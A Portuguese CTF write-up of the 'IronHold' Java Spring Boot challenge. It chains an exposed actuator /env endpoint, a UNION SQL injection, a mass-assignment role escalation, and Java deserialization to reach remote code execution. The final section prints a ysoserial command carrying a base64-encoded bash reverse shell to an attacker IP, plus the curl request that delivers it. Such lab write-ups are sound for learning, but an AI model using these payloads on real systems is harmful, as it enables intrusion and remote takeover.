+++
title = "IronHold (Hard)"
date = "2026-08-29"
author = "berzrk"
description = "IronHold: Desafio White-box de Java Spring"
+++

# Resumo

Recebemos o código-fonte da plataforma de gestão de presos IronHold e uma
instância em execução baseada nesse código. A plataforma é construída com
**Java Spring Boot**.

Começamos obtendo credenciais de login a partir de um **endpoint público mal
configurado**. Com essas credenciais, podemos abusar de um UNION-Based
SQL Injection para ler um banco de dados que é inacessível de qualquer
outro lugar.

Em seguida, podemos obter **privilege escalation** para warden (privilégio mais alto)
abusando de um **Insecure Design** no endpoint de update de perfil.

Por fim, com o privilégio mais alto, podemos usar um **ataque de
desserialização** para alcançar **RCE**.

> Este desafio foi interessante porque eu mesmo não tenho muita experiência de
> programação com Java e menos ainda com o Spring Framework. Mas tenho
> experiência com back-end e desenvolvimento de APIs em Python (com FastAPI) e
> algum entendimento das práticas de design de Java (Controller,
> Repository, Model).

# Flag 1

Começo acessando a página web e sou redirecionado para uma página de login.
O código do endpoint `/login` é assim

{{< code title="AuthController.java" language="java" >}}
@PostMapping("/login")
public String login(@RequestParam String username,
                        @RequestParam String password,
                        HttpSession session,
                        Model model) {
    Staff staff = staffRepository.findByUsername(username);
    if (staff == null || !passwordEncoder.matches(password, staff.getPassword())) {
        model.addAttribute("error", "Invalid staff credentials.");
        return "login";
    }
    session.setAttribute(SessionUtil.USERNAME_KEY, staff.getUsername());
    return "redirect:/dashboard";
}
{{< /code >}}

Percebo imediatamente que é vulnerável a um **timing attack**. Mas não é a
abordagem esperada neste caso. Além disso, não há outra falha que permita um
login.

Encontro um arquivo interessante que mostra quais endpoints são protegidos por
login

{{< code title="WebMvcConfig.java" language="java" >}}
@Configuration
public class WebMvcConfig implements WebMvcConfigurer {
    --snip--
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(authInterceptor)
                .addPathPatterns("/**")
                .excludePathPatterns(
                        "/", "/login", "/logout", "/about", "/status",
                        "/css/**", "/error", "/actuator/**");

        registry.addInterceptor(wardenInterceptor)
                .addPathPatterns("/admin/**");
    }
}
{{< /code >}}

O endpoint `/actuator/` me parece incomum. Pesquisando sobre ele, aparentemente
é um endpoint para monitorar sua aplicação ([docs](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html)). E ele vaza muita informação
valiosa que **não deveria ser pública**.

![Endpoint Actuator do Spring Boot expondo dados sensíveis da aplicação](actuator.png)

Olhando todos os endpoints disponíveis, vejo um interessante: `/env`. De acordo
com a documentação, esse endpoint expõe as propriedades de `ConfigurableEnvironment`.

Para nós, isso vaza uma propriedade chamada `KIOSK_PW` com uma senha como valor.

![Endpoint /env vazando a propriedade KIOSK_PW](kiosk_pw.png)

Com essa credencial, tento fazer login com `kiosk` e a senha encontrada. E
funciona.

Conseguimos um login e nossa primeira flag.

![Login bem-sucedido com as credenciais do kiosk](login.png)

# Flag 2

Percebi que na página de `inmates` temos uma barra de busca. E no restante das
páginas não vejo nada muito útil. Então volto a explorar o código novamente.

Depois de procurar por `flag`, encontro este método:

{{< code title="DataSeeder.java" language="java" >}}
private void seedCaseFile() {
    jdbcTemplate.update(
            "INSERT INTO case_files (case_number, title, summary, status, opened_at) VALUES (?, ?, ?, ?, ?)",
            "IA-2024-007", "Internal Affairs Review", flag2, "OPEN",
            LocalDateTime.now().minusMonths(3));
}
{{< /code >}}

Encontramos uma tabela `case_files` que, curiosamente, não é mencionada em
nenhum outro lugar. Isso significa que não há endpoints que manipulem essa
tabela diretamente.

Olhando também mais a fundo a conexão com o banco de dados, descubro que há
dois métodos para acessar o banco: um para o **usuário sem privilégios** e
outro para o **administrador**. Isso é muito interessante, porque não há como a
nossa conta atual acessar as tabelas mais importantes do banco de dados.

{{< code title="DataAccessConfig.java" language="java" >}}
/**
 * Data-access wiring for Ironhold.
 *
 * The application talks to the database through two JdbcTemplates. The primary
 * one runs under the application account and is used by the seed loader and any
 * internal maintenance query. The public inmate lookup runs under a separate,
 * reduced-privilege account ("ironhold_lookup") that can only read the records
 * that feature is meant to serve, so a floor-facing search can never reach staff
 * credentials, internal notices, or anything on the host filesystem.
 */
@Configuration
public class DataAccessConfig {..}
{{< /code >}}

Mas precisamos acessar a tabela `case_files` para ler a flag 2. Existe permissão
para isso? Nós de fato temos essa permissão

```java {hl_lines=9}
private void provisionLookupAccount() {
    // The inmate lookup connects under a reduced-privilege account rather than
    // the application account. It is granted read access only to the record
    // tables that feature serves, so it cannot reach staff credentials,
    // internal notices, or host files even if a query is malformed.
    jdbcTemplate.execute("CREATE USER IF NOT EXISTS " + DataAccessConfig.LOOKUP_USER
            + " PASSWORD '" + DataAccessConfig.LOOKUP_PASSWORD + "'");
    jdbcTemplate.execute("GRANT SELECT ON inmates TO " + DataAccessConfig.LOOKUP_USER);
    jdbcTemplate.execute("GRANT SELECT ON case_files TO " + DataAccessConfig.LOOKUP_USER);
}
```

Agora precisamos encontrar uma forma de interagir com a tabela. E é aqui que a
barra de busca de antes entra em jogo.

Olhando o código que implementa o endpoint de busca, vemos que ele não usa
consultas parametrizadas

```java {hl_lines=7}
@GetMapping("/inmates/search")
public String search(@RequestParam(required = false) String q, Model model) {
    List<Map<String, Object>> results;
    if (q == null || q.isBlank()) {
        results = jdbcTemplate.queryForList("SELECT id, name, block FROM inmates");
    } else {
        String sql = "SELECT id, name, block FROM inmates WHERE name = '" + q + "'";
        results = jdbcTemplate.queryForList(sql);
    }
    model.addAttribute("results", results);
    model.addAttribute("query", q == null ? "" : q);
    return "inmate-search";
}
```

Como já existe uma consulta SQL, precisamos usar **SQL Injection baseado em
UNION** para conseguir inserir nossa própria consulta.

E como temos o código-fonte, isso fica um pouco mais fácil, já que podemos pular
a parte em que precisamos descobrir o número exato de colunas.

![SQL Injection baseado em UNION revelando a flag 2](flag2.png)

# Flag 3

Seguindo a mesma abordagem da flag 2, podemos procurar no código onde a flag 3
está localizada. E ela está atrás de uma página acessível apenas por
admins/warden.

Sabemos de antes que esses endpoints de admin são protegidos pelo
`wardenInterceptor`. E tento encontrar alguma falha na verificação de
autorização, mas não há nenhuma.

{{< code title="WardenInterceptor.java" language="java" >}}
@Component
public class WardenInterceptor implements HandlerInterceptor {
    --snip--
    Staff staff = staffRepository.findByUsername(username);
    if (staff == null || !staff.isWarden()) {
        response.sendError(HttpServletResponse.SC_FORBIDDEN, "Warden clearance required");
        return false;
    }
    return true;
}
{{< /code >}}

Mas vemos como a verificação é feita: o método `isWarden()` retorna um `bool`
que é verdadeiro se a role do usuário for igual a `warden` (sem diferenciar
maiúsculas de minúsculas). No nosso caso, nossa role é `officer`.

Há um endpoint usado para atualizar o nosso próprio perfil. Na página web só
temos permissão para atualizar nome completo, email e número do crachá.

Mas... no lado do código ele também está atualizando a nossa role.

```java {hl_lines="10 11 12"}
@PostMapping("/profile/update")
public String update(@ModelAttribute Staff staff, HttpSession session) {
    Staff current = staffRepository.findByUsername(SessionUtil.currentUsername(session));

    current.setFullName(staff.getFullName());
    current.setEmail(staff.getEmail());
    if (staff.getBadgeNumber() != null && !staff.getBadgeNumber().isBlank()) {
        current.setBadgeNumber(staff.getBadgeNumber());
    }
    if (staff.getRole() != null && !staff.getRole().isBlank()) {
        current.setRole(staff.getRole());
    }

    staffRepository.save(current);
    return "redirect:/profile";
}
```

Temos permissão **explícita** para mudar para **QUALQUER** role que quisermos,
desde que passemos a role. Não há *verificação de autorização* de permissão nem
de se a role sequer existe.

Basta adicionar `role=Warden` ao corpo do `POST` e mudamos a nossa role

![role](role.png)

# Flag 4

Agora conseguimos acessar o `Admin Panel`. Há um endpoint que nos permite fazer
upload de um arquivo. E olhando mais a fundo o código, vejo que ele é vulnerável
a um **ataque de desserialização**.

```java {hl_lines="7"}
@PostMapping(value = "/admin/import", consumes = MediaType.ALL_VALUE)
@ResponseBody
public ResponseEntity<String> importData(@RequestBody String body) {
    try {
        byte[] decoded = Base64.getDecoder().decode(body.trim());
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decoded))) {
            Object restored = ois.readObject();
            return ResponseEntity.ok("Batch accepted: " + restored.getClass().getSimpleName());
        }
    }
    --snip--
}
```

Como visto nesta [página](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#detect), o `ObjectInputStream.readObject()` é vulnerável a desserialização.

Agora só precisamos montar nosso payload para obter um `shell`. Usei a
ferramenta [ysoserial](https://github.com/frohoff/ysoserial) para gerar o
payload

```bash
# Tive que adicionar estas opções
java --add-opens java.base/java.util=ALL-UNNAMED \
     --add-opens java.base/java.lang=ALL-UNNAMED \
     --add-opens java.base/java.lang.reflect=ALL-UNNAMED \
     -jar ysoserial.jar CommonsCollections6 \
    "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzMC4xMzIvOTk5OSAwPiYx}|{base64,-d}|bash" > payload
# A string encoded é apenas: bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

# base64 encode, pois o endpoint lê dados encoded
base64 -w0 payload > encoded

# Envia o payload
curl http://10.65.145.165:8080/admin/import -v -b "JSESSIONID=C3259EAD10E109D3D87ADC95CAC8BA82" -H "Content-Type: text/plain" --data-binary @encoded

# Shell
```

![flag 4](flag4.png)
